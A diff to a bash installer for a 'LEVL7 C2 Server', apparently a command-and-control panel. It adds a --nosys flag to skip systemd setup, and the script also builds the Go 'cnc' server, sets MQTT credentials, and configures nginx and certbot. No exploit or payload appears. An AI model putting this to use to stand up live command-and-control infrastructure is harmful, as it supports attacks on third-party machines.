@@ -6,10 +6,28 @@ log() { echo -e "${GREEN}[+]${NC} $1"; }
 warn() { echo -e "${YELLOW}[!]${NC} $1"; }
 err() { echo -e "${RED}[-]${NC} $1"; exit 1; }
 
-if [ $EUID -ne 0 ]; then err "Run as root (sudo)."; fi
+for arg in "$@"; do
+  [ "$arg" = "--help" ] || [ "$arg" = "-h" ] && { echo "Usage: $0 [domain] [--nosys]"; echo "  --nosys  Skip systemd service setup (just build + configure)"; exit 0; }
+done
+[ $EUID -ne 0 ] && err "Run as root (sudo)."
 
-# -- Config ----------------------------------------------------------------
-DOMAIN="${1:-}"
+NOSYS=false
+POSITIONAL=()
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    --nosys) NOSYS=true; shift ;;
+
+    -*)
+      err "Unknown flag: $1"
+      ;;
+    *)
+      POSITIONAL+=("$1")
+      shift
+      ;;
+  esac
+done
+
+DOMAIN="${POSITIONAL[0]:-}"
 if [ -z "$DOMAIN" ]; then
   read -r -p "Enter domain (e.g. panel.yoursite.com): " DOMAIN
   [ -z "$DOMAIN" ] && err "Domain required."
@@ -79,12 +97,17 @@ sed -i "s|Password: \".*\"|Password: \"${MQTT_PASS}\"|" "$REPO_DIR/cnc/mqtt.go"
 log "Rebuilding server with MQTT credentials..."
 cd cnc && go build -o "$REPO_DIR/server" . && cd "$REPO_DIR"
 
-systemctl enable mosquitto
-systemctl restart mosquitto
+if ! $NOSYS; then
+  systemctl enable mosquitto || warn "systemd not available (container?)"
+  systemctl restart mosquitto || warn "Could not restart mosquitto via systemd"
+fi
 
 # -- Systemd Service ------------------------------------------------------
-log "Creating systemd service..."
-cat > "$SERVICE_FILE" <<EOF
+if $NOSYS; then
+  log "Skipping systemd service setup (--nosys). Run manually: $REPO_DIR/server -web $SERVER_PORT"
+else
+  log "Creating systemd service..."
+  cat > "$SERVICE_FILE" <<EOF
 [Unit]
 Description=LEVL7 C2 Server
 After=network.target mosquitto.service
@@ -103,8 +126,9 @@ LimitNOFILE=65536
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reload
-systemctl enable "$SERVICE_NAME"
+  systemctl daemon-reload || warn "systemd not available"
+  systemctl enable "$SERVICE_NAME" || warn "Could not enable service via systemd"
+fi || warn "Could not enable service via systemd"
 
 # -- Nginx -----------------------------------------------------------------
 log "Configuring nginx..."
@@ -153,11 +177,17 @@ log "Obtaining SSL certificate..."
 certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos --email "admin@${DOMAIN}" --redirect || \
   warn "Certbot failed. You may need to run: certbot --nginx -d $DOMAIN"
 
-systemctl reload nginx
+if ! $NOSYS; then
+  systemctl reload nginx || warn "Could not reload nginx"
+fi
 
 # -- Start ----------------------------------------------------------------
-log "Starting $SERVICE_NAME..."
-systemctl restart "$SERVICE_NAME"
+if $NOSYS; then
+  log "Start manually: $REPO_DIR/server -web $SERVER_PORT"
+else
+  log "Starting $SERVICE_NAME..."
+  systemctl restart "$SERVICE_NAME" || warn "Could not start service via systemd"
+fi
 
 log "--- Installation complete ---"
 log "Domain: https://$DOMAIN"
